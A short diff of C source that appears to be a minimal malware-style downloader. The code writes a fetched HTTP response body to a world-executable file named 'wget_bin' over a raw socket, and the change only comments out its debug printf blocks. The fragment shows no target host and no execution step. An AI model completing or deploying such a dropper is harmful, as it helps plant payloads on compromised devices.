@@ -76,14 +76,14 @@ int main(int argc, char **args)
 
     ffd = open("wget_bin", O_WRONLY | O_CREAT | O_TRUNC, 0777);
     sfd = socket(AF_INET, SOCK_STREAM, 0);
-
+/*
 #ifdef DEBUG
     if (ffd == -1)
         printf("Failed to open file!\n");
     if (sfd == -1)
         printf("Failed to call socket()\n");
 #endif
-
+*/
     if (sfd == -1 || ffd == -1)
         __exit(1);
 
@@ -106,10 +106,11 @@ int main(int argc, char **args)
             __exit(4);
         header_parser = (header_parser << 8) | ch;
     }
+/*
 #ifdef DEBUG
     printf("Finished receiving HTTP header\n");
 #endif
-
+*/
     while (1)
     {
         int ret = read(sfd, recvbuf, sizeof (recvbuf));
